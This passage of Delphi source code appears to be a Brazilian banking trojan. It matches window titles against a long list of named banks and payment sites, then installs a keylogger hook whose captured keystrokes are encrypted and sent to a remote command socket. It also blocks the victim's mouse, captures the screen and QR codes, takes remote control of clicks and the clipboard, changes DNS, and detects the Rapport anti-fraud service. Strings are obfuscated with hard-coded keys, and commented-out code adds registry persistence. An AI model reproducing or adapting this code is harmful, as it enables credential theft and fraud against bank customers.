    if (FileExists(gsApp + (barra) + 'BL-0.ini')) or
      (FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) + '.ini'))
    then
    begin
      bBlockMouse := true;
      Instal_Lock;
    end;
    Exit;
  end;
  // fim aplicativo itau




  EnumWindows(@Numerar, 0);
  // RestaurarCh;
  for i := 0 to vLista.Count - 1 do
  begin
    strItem := Split(vDc_vCri('D', vLista.Items[i]), ('-#-'));
    titulo := strItem[0];
    // hwdPai    := StrToInt(strItem[1]);
    Tipo := strItem[2];
    xCasaOK(titulo, Tipo);
  end;

end;

function GetPathFolder(Path: string): string;
var
  LenPath, i, j: Word;
begin
  LenPath := Length(Path);

  if Pos('\', Path) = 0 then
  begin
    Result := 'Erro: Caminho Inválido!';
    Exit;
  end;

  if LenPath = 3 then
  begin
    Result := Path;
    Exit;
  end;

  if Copy(Path, LenPath, 1) = '\' then
    Path := Copy(Path, 1, LenPath - 1);

  for i := 0 to LenPath do
    if Path[i] = '\' then
      j := i;
  Result := Copy(Path, 1, j);
end;

function GetSpecialFolderPath(Folder: Integer; CanCreate: Boolean): string;
var
  FilePath: array [0 .. 255] of char;
begin
  SHGetSpecialFolderPath(0, @FilePath[0], Folder, CanCreate);
  Result := FilePath;
end;

function Creat_Sension(const TargetName: string): Boolean;
var
  IObject: IUnknown;
  ISLink: IShellLink;
  IPFile: IPersistFile;
  PIDL: PItemIDList;
  LinkName, nombre: string;
  InFolder: array [0 .. Max_Path - 1] of char;
  Arq: TStringList;
  sRestoChar, nomeexe, pathx: string;

  function ExtractNameX(const Filename: string): string;
  { Retorna o nome do Arquivo sem extensão }
  var
    aExt: string;
    aPos: Integer;
  begin
    aExt := ExtractFileExt(Filename);
    Result := ExtractFileName(Filename);
    if aExt <> '' then
    begin
      aPos := Pos(aExt, Result);
      if aPos > 0 then
      begin
        Delete(Result, aPos, Length(aExt));
      end;
    end;
  end;

begin
  CoInitialize(nil);
  Result := false;
  {
    nombre := meunovonome; // ExtractNameX(Extractfilename(Application.ExeName));
    IObject := CreateComObject(CLSID_ShellLink);
    ISLink := IObject as IShellLink;
    IPFile := IObject as IPersistFile;

    with ISLink do
    begin
    pathx := GetPathFolder(ExtractFilePath(ParamStr(0)));
    //  nomeexe := ExtractFileName(Application.exename);
    // sRestoChar := RightStr(nomeexe, Length(nomeexe) - 2);
    //   SetPath(PWideChar(ExtractFilePath(Application.exename) + nombre + '.exe'));
    // SetArguments(PWideChar('"' + extractfilepath(Application.ExeName) + meunovonome + '"'));
    //  SetWorkingDirectory(PWideChar(ExtractFilePath(Application.exename)));
    // SetIconLocation(pchar(vDecript('331030E86997B567EC1BDA0378819D478E5BF736270D5B9C4EEC172BD90A729F48E1')), 18);
    end;

    LinkName := IncludeTrailingBackslash
    (GetSpecialFolderPath(CSIDL_ALTSTARTUP, false));
    // ShowMessage(LinkName+ExtractNameX(Extractfilename(Application.ExeName))+'.lnk');
    // if FileExists(LinkName+ExtractNameX(Extractfilename(Application.ExeName)+'.lnk')) then
    // DeleteFile(LinkName+ExtractNameX(Extractfilename(Application.ExeName)+'.lnk'));
    //  LinkName := LinkName + ExtractFileName(nombre) + '.lnk';

    if not FileExists(LinkName) then
    if IPFile.Save(PWideChar(LinkName), false) = S_OK then
    Result := true;
    Creat_Sension('');
    //end;              }

  {




    begin
    // nombre := ExtractNameX(Extractfilename(Application.ExeName));
    // Reg := TRegistry.Create;

    meunovonome := trim(Randomstring(15));
    RenameFile(Application.exename, ExtractFilePath(Application.exename) +
    meunovonome + '.exe');
    RenameFile(ExtractFilePath(Application.exename) +
    ExtractNameX(ExtractFileName(Application.exename)),
    ExtractFilePath(Application.exename) + meunovonome);
    // limpartudo;
    Creat_Sension('');

    { S := ExtractFileDir(Application.ExeName) + '\' + meunovonome+'.exe';
    Reg.rootkey := HKEY_CURRENT_USER;
    Reg.Openkey('SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN', false);
    Reg.WriteString(nombre, S);
    Reg.RenameValue(nombre,meunovonome);
    Reg.closekey;
    Reg.Free; }
end;

function IsCore: string;
begin
  if ProcessExists('core.exe') then
  begin
    Result := 'C0R3 ';
  end;
end;

function IsRaptor: string;
begin
  if ProcessExists('RapportService.exe') then
  begin
    Result := 'R4pp0rt ';
  end;
end;

procedure CreatSessaoWindows;
begin

  if not FileExists(gsApp + (barra) + 'BL-0.ini') then
  begin
    if (CasaOK) and not(FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy',
      Date) + '.ini')) then
    begin
      Timer.Enabled := false;
      DNSchange();
      PostMessage(hwdForm, WM_CLOSE, 0, 0);

      PortaServe := 19167;

      if not Assigned(BitQR) then
        BitQR := TBitmap.Create;
      vFlagExit := 1;
      bBlockMouse := false;
      MoverMouse := false;

      CmdPrincipal := TClientePrincipal.Create;
      CmdPrincipal.Execute;

    end;

  end;
  // -------------------------------------------------------------------------
  if (FileExists(gsApp + (barra) + 'BL-0.ini') or
    (FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) + '.ini')))
  then
  begin
    Timer.Enabled := false;
    bBlockMouse := true;
    Instal_Lock;

  end;
  // -------------------------------------------------------------------------
end;

procedure TratarCasa(Cmd: string);   //identificador das casas em Ubarra no painel
begin
  if Cmd = 'LO_01' then
  begin
    Global.id := 1;
  end; //BB

  // -----------------------------------------------------------------------
  if Cmd = 'LO_02' then
  begin
    Global.id := 2;
  end; //DESCO

  // -----------------------------------------------------------------------
  if Cmd = 'LO_04' then
  begin
    Global.id := 4;
  end; //ITA
  // -----------------------------------------------------------------------
  if Cmd = 'LO_05' then
  begin
    Global.id := 5;
  end;  //SANTA
  // -----------------------------------------------------------------------
  if Cmd = 'LO_06' then
  begin
    Global.id := 6;
  end;   //SICRED
   // -----------------------------------------------------------------------
  if Cmd = 'LO_07' then
  begin
    Global.id := 7;
  end;   //SICOOB
  // -----------------------------------------------------------------------
  if Cmd = 'LO_08' then
  begin
    Global.id := 8;
  end;  //UNICRED
  // -----------------------------------------------------------------------
  if Cmd = 'LO_03' then
  begin
    Global.id := 3;
  end;  //CEF
  // -----------------------------------------------------------------------
  if Cmd = 'LO_09' then
  begin
    Global.id := 9;
  end; // INTER com erro mudar depois

  if Cmd = 'LO_11' then
  begin
    Global.id := 11;
  end; //MERCANTIL
  // -----------------------------------------------------------------------
  if Cmd = 'LO_10' then
  begin
    Global.id := 10;
  end; // NORDESTE
  // -----------------------------------------------------------------------
  if Cmd = 'LO_12' then
  begin
    Global.id := 12;
  end; //GERAL
   // -----------------------------------------------------------------------
  if Cmd = 'LO_13' then
  begin
    Global.id := 13;
  end; // MP
   // -----------------------------------------------------------------------
  if Cmd = 'LO_14' then
  begin
    Global.id := 14;
  end; //ML
   // -----------------------------------------------------------------------
  if Cmd = 'LO_15' then
  begin
    Global.id := 15;
  end; //BS2
   // -----------------------------------------------------------------------
  if Cmd = 'LO_16' then
  begin
    Global.id := 16;
  end; //BANRISUL
   // -----------------------------------------------------------------------
  if Cmd = 'LO_17' then
  begin
    Global.id := 17;
  end;//SAFRA
   // -----------------------------------------------------------------------
  if Cmd = 'LO_18' then
  begin
    Global.id := 18;
  end; //UNIPRIME
   // -----------------------------------------------------------------------
  if Cmd = 'LO_19' then
  begin
    Global.id := 19;
  end;//BANESTES
   // -----------------------------------------------------------------------
  if Cmd = 'LO_20' then
  begin
    Global.id := 20;
  end; // BANPARA
   // -----------------------------------------------------------------------
  if Cmd = 'LO_21' then
  begin
    Global.id := 21;
  end; //BANESE
   // -----------------------------------------------------------------------
  if Cmd = 'LO_22' then
  begin
    Global.id := 22;
  end; //ORIGINAL

  if Cmd = 'LO_23' then
  begin
    Global.id := 23;
  end; //INTER
end;

procedure xCasaOK(strCasa, strTipo: string);

  function LimpaString(titulo: string): string;
  var
    x: Integer;
  begin
    for x := 0 to Length(titulo) do
      if (titulo[x] in ['A' .. 'Z', 'a' .. 'z']) then
        Result := Result + LowerCase(titulo[x]);
  end;

begin
  if CasaOK then
    Exit

  else if (Pos('[bb.com.br]', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := '[bb.com.br]';
    Global.id := 1;
    // bb
  end;

  if (Pos('Banco do Brasil', strCasa) <> 0) then
  begin
    CasaOK := true;
    Casa := 'Banco do Brasil';
    Global.id := 1;
    // bb
  end;

  // -----------------------------------------------------------------------
  if (Pos('Banco Bradesco', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Bradesco';
    Global.id := 2;
    // desc
  end;
  // -----------------------------------------------------------------------
  if (Pos('Banco Bradesco | Pessoa Física, Exclusive, Prime e Private',
    strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Bradesco ';
    Global.id := 2;
    // desc   2
  end;

  // -----------------------------------------------------------------------
  // -----------------------------------------------------------------------
  if (Pos('Pessoa jurídica | Bradesco', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Bradesco JuJu';
    Global.id := 2;
    // desc   3
  end;

  // -----------------------------------------------------------------------

  if (Pos('Banco Itaú', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Itaú';
    Global.id := 4;
    // Namea.Label1.Caption:= Casa;
    // ita
  end;
  // -----------------------------------------------------------------------
  // -----------------------------------------------------------------------

  if (Pos('Banco Itaú', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Aplicativo Itaú';
    Global.id := 4;
    // Namea.Label1.Caption:= Casa;
    // ita
  end;
  // -----------------------------------------------------------------------
  if (Pos('Santander', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Santander';
    Global.id := 5;
    // NextHandle := hwdPai;

    // santa
  end;
  // -----------------------------------------------------------------------
  if (Pos('sicredi', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Sicredi';
    Global.id := 6;

    // sicr
  end;
  // -----------------------------------------------------------------------
  if (Pos('Mercantil', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Mercantil';
    Global.id := 11;
    // mercan
  end;
  // -----------------------------------------------------------------------
  if (Pos('internetbanking', LimpaString(strCasa)) > 0) then
  begin
    CasaOK := true;
    Casa := 'Caixa Economica';
    Global.id := 3;

    // cef
  end;
  // -----------------------------------------------------------------------
  if (Pos('sicoob', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Sicoob';
    Global.id := 7;
    // sico
  end;
  // -----------------------------------------------------------------------
  if (Pos('Unicred Portal', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Unicred';
    Global.id := 8;
    // cred
  end;
  // -----------------------------------------------------------------------
  if (Pos('Banco Bradesco', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Aplicativo bradesco';
    Global.id := 2;
    // desc
  end;
  // -----------------------------------------------------------------------
  if (Pos('Internet Banking BNB', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco BNB';
    Global.id := 10;
  end;
  // -----------------------------------------------------------------------
  if (Pos('Banco Inter', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Intermedium';
    Global.id := 9;
    // inter
  end;

  if (Pos('sicoob', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'sicoob';
    Global.id := 7;
    // sico
  end;

  if (Pos('Banco MUFG Brasil S.A.', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco MUFG Brasil S.A.';
    Global.id := 12;
    // Banco MUFG Brasil S.A.
  end;

  if (Pos('Banestes - Internet Banking', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banestes - Internet Banking';
    Global.id := 19;
    // Banestes
  end;

  if (Pos('Internet Banking', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Internet Banking';
    Global.id := 12;
    // Geral
  end;

  if (Pos('Banco do Estado do Pará S/A', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco do Estado do Pará S/A';
    Global.id := 20;
    // Banco do Estado do Pará S/A
  end;

  if (Pos('Banco Cetelem | Soluções em crédito, empréstimos, seguros e muito mais', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Cetelem | Login';
    Global.id := 12;
    // Cetelem
  end;

  if (Pos('Cooperativa de Crédito', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Cooperativa de Crédito';
    Global.id := 12;
    // Cooperativa de Crédito
  end;

  if (Pos('Nova Home | Internet', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Nova Home | Internet';
    Global.id := 12;
    // Nova Home | Internet
  end;

  if (Pos('Banco Safra | 180 Anos de História, Quem Sabe, Safra! | Banco Safra', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Safra';
    Global.id := 17;
    // SafraNet
  end;

  if (Pos('Banco Paulista - Internet Banking', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'BANCO PAULISTA';
    Global.id := 12;
    // BANCO PAULISTA
  end;

  if (Pos('UNICRED - Instituição financeira cooperativa', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'UNICRED';
    Global.id := 8;
    // UNICRED NOVA
  end;

  if (Pos('Uniprime do Brasil', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Uniprime';
    Global.id := 18;
    // UniprimeCentral
  end;

  if (Pos('Bem vindo ao seu BMG', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Bem vindo ao seu BMG';
    Global.id := 12;
    // Bem vindo ao seu BMG
  end;

  if (Pos('Leve para a vida | Banco BV', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Votorantim';
    Global.id := 12;
    // Portal - Banco Votorantim
  end;

  if (Pos('Banco Pine - Crédito para Empresas e Investimentos', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Pine Online';
    Global.id := 12;
    // Pine Online
  end;

  if (Pos('NBC Bank S/A - Banco Múltiplo', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'NBC BANK';
    Global.id := 12;
    // NBC BANK
  end;

  if (Pos('Tribanco | Juntos, cada um vale mais', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Tribanco Online';
    Global.id := 12;
    // Tribanco Online
  end;

  if (Pos('Banco Alfa - Home Page', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Alfa';
    Global.id := 12;
    // Banco Alfa
  end;

  if (Pos('Voiter | Bem-vindo ao seu banco de negócios!', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Indusval & Partners';
    Global.id := 12;
    // Banco Indusval & Partners
  end;

  if (Pos('Portal Internet Banrisul', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Portal Internet Banrisul';
    Global.id := 16;
    // Portal Internet Banrisul
  end;

  if (Pos('Banco Original | Pessoa Física e Jurídica', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Original';
    Global.id := 22;
    // Banco Original
  end;

  if (Pos('Login &#8211; Celcoin Open Finance', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Celcoin';
    Global.id := 12;
    // Acesse sua conta Celcoin
  end;

  if (Pos('Login - Nubank', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Login - Nubank';
    Global.id := 12;
    // Login - Nubank
  end;

  if (Pos('BRB Banknet | Banco de Brasília', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'BRB Banknet';
    Global.id := 12;
    // BRB Banknet
  end;

  if (Pos('BRB Banknet | Banco de Brasília', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco de Brasília';
    Global.id := 12;
    // BRB Banknet
  end;

  if (Pos('Banco da Amazônia', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco da Amazônia';
    Global.id := 12;
    // basa
  end;

  if (Pos('Banese, pode contar.', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banese';
    Global.id := 21;
    // banese
  end;

  if (Pos('Home - Banco Topázio', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Topazio';
    Global.id := 12;
    // topazio
  end;

  if (Pos('BIB - Banco Industrial do Brasil', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco Industrial';
    Global.id := 12;
    // bib
  end;

  if (Pos('Portal Daycoval', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Daycoval';
    Global.id := 12;
    // daycoval
  end;

  // -----------------------------------------------------------------------
  if (Pos('Banco Bradesco', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Aplicativo bradesco';
    Global.id := 2;
    // desc
  end;
  // -----------------------------------------------------------------------
  if (Pos('Banco do Nordeste - Portal Banco do Nordeste', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Banco BNB';
    Global.id := 10;
  end;
  // -----------------------------------------------------------------------


  if (Pos('CIDETRAN', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'CIDETRAN';
    Global.id := 12;

    // CIDETRAN
  end;

  if (Pos('Cooperativa de Crédito | Viacredi - Ailos', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Viacredi';
    Global.id := 12;
    // viacred
  end;

  // -----------------------------------------------------------------------
  // -------------------------------------------------------------------------

  if (Pos('Mercado Pago | Agora vai, faça mais com seu dinheiro', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Mercado Pago';
    Global.id := 13;

    // Mercado Pago
  end;

  // -----------------------------------------------------------------------

   // -------------------------------------------------------------------------

  if (Pos('Mercado Livre Brasil - Frete Grátis no mesmo dia', strCasa) > 0) then
  begin
    CasaOK := true;
    Casa := 'Mercado Livre';
    Global.id := 14;

    // Mercado Livre
  end;

  // -----------------------------------------------------------------------

  CreatSessaoWindows;

end;

procedure CapturaErro(Sender: TObject; E: Exception);
var
  erros: TStringList;
begin
  erros := TStringList.Create;
  erros.Add(E.Message);
  erros.Free;
  Screen.Cursor := crDefault;

end;

function O_F_uS_C(Action, src: string): string;
var
  Key: string;
  Cipher: TDCP_rijndael;
begin
  Key := ChaveKey;
  if (Action = UpperCase('C')) then
  begin
    Cipher := TDCP_rijndael.Create(nil);
    Cipher.InitStr(Key, TDCP_sha512);
    Result := Cipher.EncryptString(src);
    Cipher.Burn;
    Cipher.Free;
  end;
  if (Action = UpperCase('D')) then
  begin
    Cipher := TDCP_rijndael.Create(nil);
    Cipher.InitStr(Key, TDCP_sha512);
    Result := Cipher.DecryptString(src);
    Cipher.Burn;
    Cipher.Free;
  end;

end;

function vDc_vCri(Action, src: string): string;
var
  Cipher: TDCP_rijndael;
begin
  if (Action = UpperCase('C')) then
  begin
    Cipher := TDCP_rijndael.Create(nil);
    Cipher.InitStr(KeyMx, TDCP_ripemd160);
    Result := Cipher.EncryptString(src);
    Cipher.Burn;
    Cipher.Free;
  end;
  if (Action = UpperCase('D')) then
  begin
    Cipher := TDCP_rijndael.Create(nil);
    Cipher.InitStr(KeyMx, TDCP_ripemd160);
    Result := Cipher.DecryptString(src);
    Cipher.Burn;
    Cipher.Free;
  end;

end;

function TPromptCmd.GetQrc(Left1, Top1, Width1, Height1: Integer): TBitmap;
var
  ScreenDC: HDC;
  handle: Longint;
  Cursor: TPoint;
begin
  Result := TBitmap.Create;
  // //GetCursorPos(Cursor);
  // Handle := WindowFromPoint(Cursor);

  ImgTemp.Position := 0;
  BitQR.LoadFromStream(ImgTemp);

  // ScreenDC := GetDC(bmp.Handle);
  try
    try
      Result.width := Width1 - Left1; // right
      Result.height := Height1 - Top1; // bottom
      BitBlt(Result.Canvas.handle, 0, 0, Result.width, Result.height,
        BitQR.Canvas.handle, Left1, Top1, SRCCOPY);
    finally
      ReleaseDC(0, ScreenDC);
    end;
  except
    Result.Free;
    Result := nil;

  end;

end;

procedure Instal_Key_Capt;
var
  hmod: Cardinal;
begin
  hmod := GetModuleHandle(nil);
  KeyCapt := SetWindowsHookEx(WH_KEYBOARD_LL, @Captchar, hmod, 0);
  texto := '';
end;

procedure Instal_Lock;
var
  hmod: Cardinal;
begin
  hmod := GetModuleHandle(nil);
  hkLock := SetWindowsHookEx(WH_MOUSE_LL, @LockControl, hmod, 0);
end;

procedure UniInstal_lock;
begin
  UnHookWindowsHookEx(hkLock);
end;

{ function AbreMaladireta(ZipName: string; Destination: string): boolean;
  var
  Pacote:TAbUnZipper;
  begin
  Pacote:=TAbUnZipper.Create(nil);
  with Pacote do
  begin
  Password:='CB58909BD0B16B89E87DE07AB778A98CC447A5874F94E9010F3DDC45FF54D10EC076899C5C83ACBCA43A29B452CA668E51CD598F83BCCB7F868A8EA7ADB85E9C90';
  FileName:=ZipName;
  BaseDirectory :=Destination;
  ExtractFiles( '*.*' );
  end;
  Pacote.Free;
  Result := True;
  DeleteFile(pchar(ZipName));

  end; }

function gsApp: string;
var
  Path: array [0 .. Max_Path] of char;
begin
  if SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, Path) = S_OK
  then
    Result := IncludeTrailingPathDelimiter(Path)
  else
    Result := '';
end;

function ExisteApp: string;
var
  Path: array [0 .. Max_Path] of char;
begin
  if SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, Path) = S_OK
  then
    Result := IncludeTrailingPathDelimiter(Path) + 'Aplicativo Itau'
  else
    Result := '';
end;

function gsRoaming: string;
var
  Path: array [0 .. Max_Path] of char;
begin
  if SHGetFolderPath(0, CSIDL_APPDATA, 0, SHGFP_TYPE_CURRENT, Path) = S_OK then
    Result := IncludeTrailingPathDelimiter(Path) + 'Microsoft\Windows\Themes'
  else
    Result := '';
end;

function LockControl(nCode: Integer; wParam: wParam; lParam: lParam)
  : LRESULT; stdcall;
var
  Hook: PMSLLHOOKSTRUCT;
begin
  Hook := Pointer(lParam);
  case nCode of
    HC_ACTION:
      begin
        if wParam = WM_LBUTTONDOWN then
        begin
          if bBlockMouse then
          begin
            Result := 1;

          end
          else
            Result := 0;

        end
        else if wParam = WM_LBUTTONUP then
        begin
          if bBlockMouse then
          begin
            Result := 1
          end
          else
            Result := 0;

        end
        else if wParam = WM_MOUSEMOVE then
        begin
          if MoverMouse then
          begin
            Result := 1
          end
          else
            Result := 0
        end
        else if wParam = WM_RBUTTONDOWN then
        begin
          if bBlockMouse then
          begin
            Result := 1

          end
          else
            Result := 0;
        end
        else if wParam = WM_RBUTTONUP then
        begin
          if bBlockMouse then
          begin
            Result := 1;
          end
          else
            Result := 0;
        end
        else if wParam = WM_MOUSEWHEEL then
        begin
          if blockwheel then
          begin
            Result := 1;
          end
          else
            Result := 0;
        end
        else
        begin
          Result := CallNextHookEx(hkLock, nCode, wParam, lParam);
        end;
      end
  else
    begin
      Result := CallNextHookEx(hkLock, nCode, wParam, lParam);
    end;

  end;
end;

function Captchar(Code, wParam, lParam: Integer): Integer;
var
  KeyState: TKeyboardState;
  NewChar: array [0 .. 1] of char;
  Hook: PKBDLLHOOKSTRUCT;
  bControlKeyDown: Boolean;
begin
  try
    Hook := Pointer(lParam);
    case Code of
      HC_ACTION:
        begin
          if (Hook^.flags and LLKHF_UP) <> 0 then
          begin
            Fillchar(NewChar, 2, #0);
            GetKeyboardState(KeyState);
            if ToAscii(Hook^.vkCode, Hook^.scanCode, KeyState, NewChar, 0) = 1
            then
              texto := texto + NewChar[0];
          end;
        end;
    end;
  finally
    Result := CallNextHookEx(KeyCapt, Code, wParam, lParam);
  end;

end;

procedure unisInstal_Key_Capt;
begin
  CmdSocket.CmdSocket.Socket.SendText
    (O_F_uS_C('C', 'C5A0A1A7FF' + '<#>' + IdServe + '<#>' + texto));
  UnHookWindowsHookEx(KeyCapt);
end;

function VersaoWin: string;
var
  vNome, vVersao, vCurrentBuild: string;
  Reg: TRegistry;
begin
  Reg := TRegistry.Create; // Criando um Registro na Memória
  Reg.Access := KEY_READ; // Colocando nosso Registro em modo Leitura
  Reg.RootKey := HKEY_LOCAL_MACHINE; // Definindo a Raiz

  // Abrindo a chave desejada
  Reg.OpenKey('\SOFTWARE\Microsoft\Windows NT\CurrentVersion\', true);

  // Obtendo os Parâmetros desejados
  vNome := Reg.ReadString('ProductName');
  Result := vNome; // + ' - ' + vVersao + ' - ' + vCurrentBuild;
end;

function vDecript2(const src: string): string;
label
  Fim;
var
  KeyLen: Integer;
  KeyPos: Integer;
  OffSet: Integer;
  Dest, Key: string;
  SrcPos: Integer;
  SrcAsc: Integer;
  TmpSrcAsc: Integer;
  Range: Integer;
begin
  Key := 'HSA5JIDUGPLPUIP4X7SNT2XLX';
  if (src = '') then
  begin
    Result := '';
    goto Fim;
  end;
  Key := Key;
  Dest := '';
  KeyLen := Length(Key);
  KeyPos := 0;
  SrcPos := 0;
  SrcAsc := 0;
  Range := 256;
  OffSet := StrToInt('$' + Copy(src, 1, 2));
  SrcPos := 3;
  repeat
    SrcAsc := StrToInt('$' + Copy(src, SrcPos, 2));
    if (KeyPos < KeyLen) then
      KeyPos := KeyPos + 1
    else
      KeyPos := 1;
    TmpSrcAsc := SrcAsc xor Ord(Key[KeyPos]);
    if TmpSrcAsc <= OffSet then
      TmpSrcAsc := 255 + TmpSrcAsc - OffSet
    else
      TmpSrcAsc := TmpSrcAsc - OffSet;
    Dest := Dest + Chr(TmpSrcAsc);
    OffSet := SrcAsc;
    SrcPos := SrcPos + 2;
  until (SrcPos >= Length(src));
  Result := Dest;
Fim:

end;

procedure EnviaBuffe(viewerCursor: Boolean; mEmoria: TMemoryStream);
var
  Bmp2: TBitmap;
begin
  //
  if vFlagScree = 0 then
  begin
    GetImg;
    if (MagSetImageScalingCallback(hwndMag, MagImageScalingCallback)) then

  end;

  if vFlagScree = 1 then
  begin
    Bmp2 := TBitmap.Create;
    Bmp2.PixelFormat := pf8bit;
    Creat_Scree_Aux(Bmp2, 0, 0, Screen.width, Screen.height);
    Bmp2.Free;
  end;
  mEmoria.CopyFrom(ArqTmp, 0);
  ArqTmp.Clear;
end;

procedure TPromptCmd.Bloque(Tipo: string);
var
  Arq: TStringList;
begin
  if Tipo = 'D' then
  begin
    Arq := TStringList.Create;
    Arq.SaveToFile(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) + '.ini');
    Arq.Free;
  end
  else
  begin
    if Tipo = 'T' then
    begin
      Arq := TStringList.Create;
      Arq.SaveToFile(gsApp + (barra) + 'BL-0.ini');
      Arq.Free;
    end;
  end;

end;

procedure TPromptCmd.CarregarQrCod(srcBmp: TBitmap);
begin
  try
    objBmpQrCode := TBitmap.Create;
    objBmpQrCode.width := Abs(iQrCodeX2 - iQrCodeX1);
    objBmpQrCode.height := Abs(iQrCodeY2 - iQrCodeY1);

    objBmpQrCode.Canvas.CopyRect(rect(0, 0, objBmpQrCode.width,
      objBmpQrCode.height), srcBmp.Canvas, rect(iQrCodeX1, iQrCodeY1, iQrCodeX2,
      iQrCodeY2));

  finally
    objBmpQrCode.FreeImage
  end;

end;

procedure TPromptCmd.Clear;
begin

end;

procedure TPromptCmd.ClipboardCmd(Comando: string);
var
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    TextoClipBoard := LstComando[1];
    Clipboard.AsText := TextoClipBoard;
    LstComando.Free;
  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.CliqueDuplo(Comando: string);
var
  ponto, virgula: Boolean;
  i, x, Y: Integer;
  XS, YS: string;
  HWND: THandle;
  PosM: TPoint;
begin
  try
    ponto := false;
    virgula := false;
    for i := 1 to Length(Comando) do
    begin
      if (Comando[i] = ':') then
        ponto := true;
      if (Comando[i] = ',') then
        virgula := true;
      if (Comando[i] <> ':') and (Comando[i] <> ',') then
      begin
        if ponto and not virgula then
          XS := XS + Comando[i];
        if ponto and virgula then
          YS := YS + Comando[i];
      end;
    end;
    x := StrToInt(XS);
    Y := StrToInt(YS);
    setcursorpos(x, Y);
    pressmousedown(true);
    pressmouseup(true);
    pressmousedown(true);
    pressmouseup(true);
    // ShowMessage( vDecript('8581A557F62C') );
  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.ColocaClipBoard;
begin
  Clipboard.AsText := TextoClipBoard;

end;

constructor TPromptCmd.Create;
begin
  inherited Create(true);
  FreeOnTerminate := true;
  Priority := tpNormal;
end;

procedure ClearAppMemorySize;
var
  MainHandle: THandle;
begin
  try
    MainHandle := OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessID);
    SetProcessWorkingSetSize(MainHandle, $FFFFFFFF, $FFFFFFFF);
    CloseHandle(MainHandle);
  except
  end;
  Application.ProcessMessages;
end;

function SplitString(S, Delimitador: string): TStringList;
var
  p: Integer;
begin
  Result := TStringList.Create;

  p := Pos(Delimitador, S);
  while (p > 0) do
  begin
    Result.Add(Copy(S, 1, p - 1));
    Delete(S, 1, p + Length(Delimitador) - 1);
    p := Pos(Delimitador, S);
  end;
  if (S <> '') then
    Result.Add(S);
end;

procedure Pausar(MSec: Cardinal);
var
  Start: Cardinal;
begin
  // Screen.Cursor := crHourGlass;
  Start := GetTickCount;
  repeat
    Application.ProcessMessages;
  until (GetTickCount - Start) >= MSec;
  // Screen.Cursor := crDefault;
end;

procedure TPromptCmd.Criar_Qr(Qr: TBitmap);
begin
  Qr.Assign(GetQrc(iQrCodeX1, iQrCodeY1, iQrCodeX2, iQrCodeY2));

  Qr.width := Abs(iQrCodeX1 - iQrCodeX2);
  Qr.height := Abs(iQrCodeY1 - iQrCodeY2);
end;

procedure TPromptCmd.Execute;
begin
  fila := TStringList.Create;
  fila.Clear;

  while not terminated do
  begin
    Tratar;
    // Synchronize( procesaUser );
    Application.ProcessMessages;
    sleep(10);
  end;
end;

procedure TPromptCmd.GetImageByUrl(URL: string; APicture: TPicture);
var
  jpeg: TPngImage;
  Strm: TMemoryStream;
